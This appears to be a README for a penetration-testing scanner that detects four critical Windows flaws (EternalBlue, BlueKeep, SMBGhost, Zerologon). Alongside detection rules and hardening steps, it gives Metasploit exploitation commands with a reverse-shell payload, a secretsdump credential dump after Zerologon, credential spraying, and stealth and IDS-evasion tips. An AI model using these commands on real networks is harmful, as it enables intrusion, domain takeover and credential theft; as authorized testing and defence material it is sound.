# VulnSeek

## Overview
VulnSeek is an automated vulnerability scanner designed for internal network penetration testing. It identifies critical vulnerabilities in Windows systems including EternalBlue (MS17-010), BlueKeep (CVE-2019-0708), SMBGhost (CVE-2020-0796), and Zerologon (CVE-2020-1472). The tool combines nmap NSE scripts with optional Metasploit modules for comprehensive vulnerability assessment.

These vulnerabilities represent some of the most dangerous Windows exploits:
- **EternalBlue**: Enabled WannaCry and NotPetya ransomware attacks
- **BlueKeep**: Wormable RDP vulnerability affecting millions of systems
- **Zerologon**: Complete domain compromise vulnerability
- **SMBGhost**: Critical SMBv3 flaw in Windows 10 and Server 2019

VulnSeek helps security professionals quickly identify these critical exposures during penetration tests and security assessments.

## Features

### Vulnerability Detection
- **MS17-010 (EternalBlue)**: SMBv1 remote code execution
- **CVE-2019-0708 (BlueKeep)**: RDP remote code execution
- **CVE-2020-0796 (SMBGhost)**: SMBv3 remote code execution
- **CVE-2020-1472 (Zerologon)**: Netlogon privilege escalation

### Scanning Methods
- **nmap NSE scripts**: Fast, non-intrusive detection
- **Metasploit modules**: Confirmed vulnerability verification
- **SMB protocol enumeration**: Version and dialect detection
- **OS fingerprinting**: Operating system identification

### Risk Assessment
- Automatic risk level assignment (CRITICAL/HIGH/MEDIUM/LOW)
- Confidence levels (CONFIRMED/HIGH/MEDIUM)
- Port-based service detection
- Hostname resolution

### Reporting
- Vulnerable host list (`vulnlist.txt`)
- Detailed findings (`vuln_details.txt`)
- JSON export (`vuln_details.json`)
- Real-time console output with color-coded risk levels

## Installation

### Prerequisites
```bash
# Kali Linux (recommended)
# nmap is pre-installed

# Ubuntu/Debian
sudo apt update
sudo apt install nmap python3 python3-pip

# CentOS/RHEL
sudo yum install nmap python3 python3-pip
```

### Optional: Metasploit Framework
```bash
# Kali Linux (pre-installed)
msfconsole -v

# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Verify installation
msfconsole -v
```

### Installation Steps
```bash
# 1. Clone or download
cd /opt/tools
git clone <repository-url> vulnseek
cd vulnseek

# 2. Make executable
chmod +x vulnseek.py

# 3. Create IP list
echo "192.168.1.0/24" > iplist.txt

# 4. Test installation
./vulnseek.py -h
```

## Usage

### Basic Usage
```bash
# Quick nmap scan (default)
./vulnseek.py

# Specify targets file
./vulnseek.py -f targets.txt

# Verbose output (show all hosts)
./vulnseek.py -v
```

### Advanced Scanning
```bash
# Use Metasploit modules (more accurate)
./vulnseek.py -m

# Full scan with OS detection
./vulnseek.py --full

# Full scan with Metasploit
./vulnseek.py --full -m

# High-speed scan
./vulnseek.py -w 20
```

### Command-Line Options
```
Positional Arguments:
  None (uses iplist.txt by default)

Optional Arguments:
  -h, --help          Show help message
  -f, --file FILE     Input file with IP addresses (default: iplist.txt)
  -w, --workers N     Number of concurrent workers (default: 5)
  -m, --metasploit    Use Metasploit modules (slower but more accurate)
  --full              Full scan (includes OS detection)
  --timeout N         Connection timeout in seconds (default: 2)
  -v, --verbose       Verbose output (show all hosts)
```

## Input File Format

### IP List File (iplist.txt)
```
# Windows servers
192.168.1.10
192.168.1.11
192.168.1.12

# Workstation subnet
192.168.2.0/24

# Legacy systems
10.0.5.50
10.0.5.51

# Domain controllers
10.0.1.10
10.0.1.11
```

### Supported Formats
- Individual IP addresses: `192.168.1.10`
- CIDR notation: `192.168.1.0/24`
- Comments with `#`
- Blank lines ignored

## Output Files

### vulnlist.txt
Simple list of vulnerable systems:
```
192.168.1.10
192.168.1.11
10.0.5.50
```
**Use case**: Input for exploitation tools

### vuln_details.txt
Comprehensive findings with remediation guidance:
```
VulnSeek - Vulnerability Scan Results
======================================================================
Scan Date: 2025-10-13 16:45:00
Total Hosts Scanned: 254
Vulnerable Hosts: 12
Critical Risk Hosts: 8
======================================================================

Host: 192.168.1.10
Hostname: WIN7-PC01.company.local
Risk Level: CRITICAL
Open Ports: 445, 3389, 135, 139
OS: Windows 7 Professional SP1
SMB Versions: SMBv1, SMBv2

Vulnerabilities Found: 2
----------------------------------------------------------------------

  ⚠ EternalBlue (CVE-2017-0144)
  Severity: CRITICAL
  Description: MS17-010 SMBv1 RCE
  Confidence: HIGH
  Detection Method: nmap

  ⚠ BlueKeep (CVE-2019-0708)
  Severity: CRITICAL
  Description: RDP Remote Code Execution
  Confidence: HIGH
  Detection Method: nmap

======================================================================
```

### vuln_details.json
Machine-readable JSON format:
```json
[
  {
    "ip": "192.168.1.10",
    "hostname": "WIN7-PC01.company.local",
    "vulnerabilities": [
      {
        "name": "EternalBlue",
        "cve": "CVE-2017-0144",
        "severity": "CRITICAL",
        "description": "MS17-010 SMBv1 RCE",
        "confidence": "HIGH",
        "method": "nmap"
      },
      {
        "name": "BlueKeep",
        "cve": "CVE-2019-0708",
        "severity": "CRITICAL",
        "description": "RDP Remote Code Execution",
        "confidence": "HIGH",
        "method": "nmap"
      }
    ],
    "os_info": {
      "os": "Windows 7 Professional SP1",
      "version": "6.1",
      "cpe": "microsoft:windows:7"
    },
    "smb_info": {
      "smb1": true,
      "smb2": true,
      "smb3": false
    },
    "ports_open": [445, 3389, 135, 139],
    "risk_level": "CRITICAL",
    "error": null
  }
]
```

## Vulnerability Details

### MS17-010 (EternalBlue)

**CVE**: CVE-2017-0144  
**Severity**: CRITICAL  
**CVSS Score**: 9.8

**Description**:
Remote code execution vulnerability in Microsoft SMBv1 server. Allows attackers to execute arbitrary code on the target system without authentication.

**Affected Systems**:
- Windows 7 SP1
- Windows 8 / 8.1
- Windows 10 (early versions)
- Windows Server 2008 / 2008 R2
- Windows Server 2012 / 2012 R2
- Windows Server 2016 (early versions)

**Detection Port**: 445 (SMB)

**Exploitation**:
```bash
# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

**Remediation**:
- Apply Microsoft Security Bulletin MS17-010
- Disable SMBv1: `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`
- Block port 445 at network perimeter
- Enable Windows Firewall

### CVE-2019-0708 (BlueKeep)

**Severity**: CRITICAL  
**CVSS Score**: 9.8

**Description**:
Remote code execution vulnerability in Remote Desktop Services. Pre-authentication flaw allows attackers to execute arbitrary code without credentials. Wormable vulnerability.

**Affected Systems**:
- Windows 7 SP1
- Windows Server 2008 SP2
- Windows Server 2008 R2 SP1
- Windows XP (unsupported)
- Windows Server 2003 (unsupported)

**Detection Port**: 3389 (RDP)

**Exploitation**:
```bash
# Metasploit (PoC available, full exploit not public)
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.10
run

# NOTE: Public exploits are unstable and may crash systems
```

**Remediation**:
- Apply Microsoft Security Update (May 2019)
- Enable Network Level Authentication (NLA)
- Restrict RDP access to known IPs only
- Use VPN for remote access instead of direct RDP

### CVE-2020-0796 (SMBGhost)

**Severity**: CRITICAL  
**CVSS Score**: 10.0

**Description**:
Remote code execution vulnerability in Microsoft SMBv3 protocol handling of compressed messages. Allows unauthenticated attackers to execute arbitrary code.

**Affected Systems**:
- Windows 10 Version 1903
- Windows 10 Version 1909
- Windows Server Version 1903
- Windows Server Version 1909

**Detection Port**: 445 (SMB)

**Exploitation**:
```bash
# Metasploit
msfconsole
use auxiliary/scanner/smb/smb_ms17_010  # Generic SMB scanner
set RHOSTS 192.168.1.10
run

# Public exploits available (use with caution)
```

**Remediation**:
- Apply KB4551762 (March 2020 update)
- Disable SMBv3 compression: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name DisableCompression -Value 1`
- Block port 445 externally
- Segment networks

### CVE-2020-1472 (Zerologon)

**Severity**: CRITICAL  
**CVSS Score**: 10.0

**Description**:
Elevation of privilege vulnerability in Netlogon Remote Protocol. Allows unauthenticated attackers to establish vulnerable Netlogon channel and change domain controller computer account password, leading to complete domain compromise.

**Affected Systems**:
- Windows Server 2008 R2
- Windows Server 2012 / 2012 R2
- Windows Server 2016
- Windows Server 2019
- Windows Server Version 1903+

**Detection Port**: 445 (SMB), 135 (RPC)

**Exploitation**:
```bash
# Metasploit
msfconsole
use auxiliary/scanner/dcerpc/zerologon
set RHOSTS 192.168.1.10
run

# Manual exploitation (Python scripts available)
python3 zerologon_tester.py DC01 192.168.1.10
```

**Remediation**:
- Apply August 2020 security updates (KB4571694, KB4571702, etc.)
- Enable enforcement mode (February 2021 updates)
- Monitor Event ID 5827, 5828, 5829 for exploitation attempts
- Implement attack detection rules

## Scanning Workflows

### Workflow 1: Quick Assessment
```bash
# 1. Fast nmap-based scan
./vulnseek.py -w 20

# 2. Review critical findings
cat vulnlist.txt

# 3. Identify easy targets
grep "CRITICAL" vuln_details.txt

# 4. Exploit with Metasploit
# Use IPs from vulnlist.txt
```

### Workflow 2: Comprehensive Audit
```bash
# 1. Full scan with OS detection
./vulnseek.py --full -m -v > scan_output.txt

# 2. Analyze by vulnerability type
grep "EternalBlue" vuln_details.txt > eternalblue_hosts.txt
grep "BlueKeep" vuln_details.txt > bluekeep_hosts.txt

# 3. Generate remediation report
# Extract affected systems by OS version

# 4. Verify patches
# Rescan after remediation
```

### Workflow 3: Targeted Exploitation
```bash
# 1. Scan specific subnets
./vulnseek.py -f dc_subnet.txt -m

# 2. Focus on domain controllers
grep "Domain Controller\|DC\|AD" vuln_details.txt

# 3. Test Zerologon
# Against identified DCs

# 4. Escalate privileges
# Use successful exploits for domain compromise
```

### Workflow 4: Continuous Monitoring
```bash
# 1. Weekly vulnerability scans
./vulnseek.py --full -v

# 2. Compare results
diff last_week_vulnlist.txt vulnlist.txt

# 3. Track remediation progress
# New vulnerabilities + patched systems

# 4. Report to management
# Trend analysis and metrics
```

## Integration with Other Tools

### With Metasploit Framework
```bash
# 1. Discover vulnerabilities
./vulnseek.py -m

# 2. Import to Metasploit workspace
msfconsole
workspace -a internal_pentest
db_import vuln_details.json

# 3. Exploit EternalBlue hosts
use exploit/windows/smb/ms17_010_eternalblue
hosts -c address,os_name -S "Windows 7"
```

### With Nmap
```bash
# 1. Initial port scan
nmap -p 445,3389,135 192.168.1.0/24 -oG - | \
  grep "/open/" | cut -d' ' -f2 > live_hosts.txt

# 2. VulnSeek vulnerability scan
./vulnseek.py -f live_hosts.txt -m

# 3. Detailed enumeration
nmap -A -sV -p- -iL vulnlist.txt
```

### With CrackMapExec
```bash
# 1. Find vulnerable systems
./vulnseek.py

# 2. Test credentials
crackmapexec smb vulnlist.txt -u administrator -p passwords.txt

# 3. Exploit with valid creds
crackmapexec smb 192.168.1.10 -u admin -p 'P@ssw0rd' \
  -M ms17-010
```

### With Impacket
```bash
# 1. Scan for Zerologon
./vulnseek.py --full -m | grep Zerologon

# 2. Exploit with Impacket scripts
python3 secretsdump.py -no-pass DC01\$@192.168.1.10

# 3. Extract domain credentials
# After successful Zerologon exploitation
```

## Detection & Defense

### Detection Signatures

**Network IDS (Snort/Suricata)**:
```
# EternalBlue exploitation attempt
alert tcp any any -> $HOME_NET 445 (
    msg:"ET EXPLOIT MS17-010 SMB Remote Code Execution";
    flow:to_server,established;
    content:"|FF|SMB|75 00 00 00 00|";
    content:"|00 4A 00 00 00 00 00|";
    sid:2024218;
)

# BlueKeep exploitation
alert tcp any any -> $HOME_NET 3389 (
    msg:"ET EXPLOIT CVE-2019-0708 BlueKeep RDP Exploit";
    flow:to_server,established;
    content:"|03 00|";  # RDP Connection Request
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:2028833;
)

# Zerologon exploitation
alert tcp any any -> $HOME_NET 445 (
    msg:"ET EXPLOIT Zerologon NetrServerAuthenticate2";
    flow:to_server,established;
    content:"|00 00 00 00 00 00 00 00|";  # NULL credentials
    sid:2030977;
)
```

**Windows Event Log Monitoring**:
```powershell
# EternalBlue indicators
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=5145  # Network share access
} | Where-Object {$_.Message -like "*ADMIN$*" -or $_.Message -like "*IPC$*"}

# BlueKeep exploitation attempts
Get-WinEvent -FilterHashtable @{
    LogName='System'
    ProviderName='TerminalServices-RemoteConnectionManager'
    ID=1149  # Authentication failures
}

# Zerologon indicators
Get-WinEvent -FilterHashtable @{
    LogName='System'
    ID=@(5827, 5828, 5829)  # Netlogon vulnerabilities
}
```

**SIEM Correlation Rules**:
```
# Rule 1: Multiple vulnerability scans
source_type = "firewall"
destination_port IN [445, 3389, 135]
flags = "SYN"
unique_destinations > 10
within 5 minutes
→ ALERT: Vulnerability scan detected

# Rule 2: EternalBlue exploitation
event_id = 5145
share_name IN ["ADMIN$", "C$"]
access_mask = "0x100180"
→ ALERT: Possible EternalBlue exploitation

# Rule 3: Zerologon exploitation
event_id IN [5827, 5828, 5829]
→ ALERT: CRITICAL - Zerologon attack detected
```

### Defense Measures

**Patching** (Priority Order):
```powershell
# 1. Critical patches
# MS17-010 (EternalBlue)
Install-WindowsUpdate -KBArticleID "KB4012212", "KB4012213", "KB4012214", "KB4012215"

# CVE-2019-0708 (BlueKeep)
Install-WindowsUpdate -KBArticleID "KB4499175", "KB4499149"

# CVE-2020-0796 (SMBGhost)
Install-WindowsUpdate -KBArticleID "KB4551762"

# CVE-2020-1472 (Zerologon)
Install-WindowsUpdate -KBArticleID "KB4571694", "KB4571702"

# 2. Enable automatic updates
Set-Service wuauserv -StartupType Automatic
Start-Service wuauserv
```

**Protocol Hardening**:
```powershell
# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart

# Verify SMBv1 is disabled
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Enable SMB signing (prevents relay attacks)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Enable SMB encryption
Set-SmbServerConfiguration -EncryptData $true -Force
```

**Network Segmentation**:
```
# Firewall rules (Windows Firewall)
# Block SMB from internet
New-NetFirewallRule -DisplayName "Block SMB Inbound" `
    -Direction Inbound -Protocol TCP -LocalPort 445 `
    -RemoteAddress Internet -Action Block

# Restrict RDP access
New-NetFirewallRule -DisplayName "RDP Admin Only" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -RemoteAddress 192.168.200.0/24 -Action Allow
```

**RDP Hardening**:
```powershell
# Enable Network Level Authentication
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
    -Name UserAuthentication -Value 1

# Set account lockout policy
net accounts /lockoutthreshold:3 /lockoutduration:30

# Require strong passwords
secedit /export /cfg c:\secconfig.cfg
# Edit: PasswordComplexity = 1
secedit /configure /db c:\windows\security\local.sdb /cfg c:\secconfig.cfg
```

**Monitoring & Alerting**:
```powershell
# Enable advanced auditing
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Special Logon" /success:enable /failure:enable

# Monitor for exploitation
$events = Get-WinEvent -FilterHashtable @{
    LogName='Security','System'
    ID=5145,1149,5827,5828,5829
    StartTime=(Get-Date).AddHours(-24)
}

if ($events.Count -gt 0) {
    Send-MailMessage -To "security@company.com" `
        -Subject "ALERT: Potential vulnerability exploitation" `
        -Body "Suspicious events detected" -SmtpServer "smtp.company.com"
}
```

## Troubleshooting

### Common Issues

**"nmap not found"**
```bash
# Install nmap
sudo apt install nmap  # Debian/Ubuntu
sudo yum install nmap  # CentOS/RHEL
brew install nmap      # macOS

# Verify installation
nmap --version
```

**"No valid IPs to scan"**
```bash
# Check file format
cat iplist.txt

# Verify file exists
ls -l iplist.txt

# Test with single IP
echo "192.168.1.10" > test.txt
./vulnseek.py -f test.txt -v
```

**"msfconsole not found" (when using -m)**
```bash
# Tool will continue without Metasploit
# To install Metasploit:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

**Slow scans**
```bash
# Reduce timeout
./vulnseek.py --timeout 1

# Increase workers
./vulnseek.py -w 20

# Use nmap only (skip Metasploit)
./vulnseek.py  # Don't use -m flag

# Scan smaller subnets
# Split /16 into multiple /24 scans
```

**False positives**
```bash
# Use Metasploit for confirmation
./vulnseek.py -m -f suspected_hosts.txt

# Manual verification
nmap --script smb-vuln-ms17-010 -p445 192.168.1.10

# Check OS version
nmap -O 192.168.1.10
```

**Permission denied errors**
```bash
# Run with sudo (for raw sockets)
sudo ./vulnseek.py

# Or adjust capabilities
sudo setcap cap_net_raw=eip /usr/bin/nmap
```

## Performance Optimization

### Scan Speed vs Accuracy

**Fast Scan** (nmap only, 5 workers):
- /24 (254 hosts): ~5-10 minutes
- /16 (65,536 hosts): ~8-15 hours
- Accuracy: 85-90%
- Use when: Time-constrained, initial discovery

**Balanced Scan** (nmap + Metasploit, 5 workers):
- /24: ~15-30 minutes
- /16: ~20-40 hours
- Accuracy: 95%+
- Use when: Standard penetration test

**Comprehensive Scan** (--full with Metasploit, verbose):
- /24: ~30-60 minutes
- /16: ~40-80 hours
- Accuracy: 99%+
- Use when: Detailed security audit

### Worker Tuning
```bash
# Network size recommendations
# <256 hosts: -w 5
# 256-1024: -w 10
# 1024-4096: -w 20
# 4096+: -w 50

# Local LAN: --timeout 1
# Remote LAN: --timeout 2
# WAN: --timeout 5
```

## Tips & Tricks

### 🎯 Targeting
- **Start with domain controllers**: Zerologon is devastating
- **Focus on Windows 7**: High EternalBlue success rate
- **Check RDP ports**: BlueKeep is easily exploitable
- **Legacy systems first**: Likely unpatched

### 🔍 Reconnaissance
- **DNS enumeration**: Find Windows hosts by name
- **Port scan first**: Reduce target list
- **Check patch levels**: `systeminfo` on compromised hosts
- **Look for XP/2003**: Unsupported, always vulnerable

### 🔒 Stealth
- **Slow scans**: `-w 3 --timeout 10`
- **Off-hours**: Scan during backups (noise cover)
- **Nmap only**: Metasploit can be noisy
- **IDS evasion**: Use `-T2` or `-T3` in custom nmap scripts

### ⚡ Speed
- **Pre-filter**: Use masscan for initial port discovery
- **High workers**: `-w 50` for large networks
- **Skip OS detection**: Remove `--full` flag
- **Parallel instances**: Split network into chunks

### 🎓 Learning
- **Lab setup**: Create vulnerable VMs (Metasploitable, DVWA)
- **Read exploit code**: Understand exploitation mechanics
- **Practice OSCP**: These are common exam targets
- **Stay updated**: New Windows CVEs regularly

## Real-World Examples

### Example 1: Enterprise Network
```bash
./vulnseek.py -f all_windows_servers.txt --full -m
# Scanned: 1,250 Windows servers
# Vulnerable: 47 hosts
#   - EternalBlue: 23 hosts (Windows 7/2008)
#   - BlueKeep: 12 hosts (Windows 7/2008)
#   - Zerologon: 2 hosts (Domain Controllers)
#   - SMBGhost: 10 hosts (Windows 10 1909)
# Time: ~6 hours
# Impact: Complete domain compromise via Zerologon
```

### Example 2: Legacy Infrastructure
```bash
./vulnseek.py -f legacy_subnet.txt -v
# Scanned: 50 legacy systems
# Vulnerable: 48 hosts
#   - All running Windows 7 SP1 (unpatched)
#   - 100% EternalBlue vulnerable
#   - 75% BlueKeep vulnerable
# Result: Full network compromise in 30 minutes
```

### Example 3: Quick Assessment
```bash
./vulnseek.py -w 20
# Scanned: 254 hosts (/24 network)
# Time: 8 minutes
# Vulnerable: 5 hosts
#   - 3x Windows 7 (EternalBlue)
#   - 2x Windows Server 2008 R2 (BlueKeep + EternalBlue)
# Outcome: Exploited for initial access
```

## Security Considerations

### For Penetration Testers
- **Authorization**: Obtain written permission before scanning
- **Scope**: Verify all targets are in scope
- **Impact**: Metasploit modules can crash vulnerable systems
- **Documentation**: Record all findings and exploitation attempts
- **Remediation**: Provide clear patch guidance to client

### For Defenders
- **Assume breach**: If vulnerable hosts found, assume compromised
- **Patch immediately**: These are wormable, zero-day-level threats
- **Network segmentation**: Limit lateral movement
- **Hunt for IoCs**: Check for signs of exploitation
- **Continuous scanning**: Re-scan after patching to verify

## References
- **MS17-010**: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
- **CVE-2019-0708**: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708
- **CVE-2020-0796**: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796
- **CVE-2020-1472**: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472
- **MITRE ATT&CK**: T1210 (Exploitation of Remote Services)
- **nmap NSE**: https://nmap.org/nsedoc/
- **Metasploit**: https://docs.rapid7.com/metasploit/

## License
This tool is for authorized security testing only. Unauthorized scanning and exploitation is illegal.

## Changelog
- **v1.0**: Initial release with EternalBlue, BlueKeep, SMBGhost, Zerologon detection

---

**Remember**: With great power comes great responsibility. These vulnerabilities are extremely dangerous. Always operate within authorized scope and follow responsible disclosure practices.
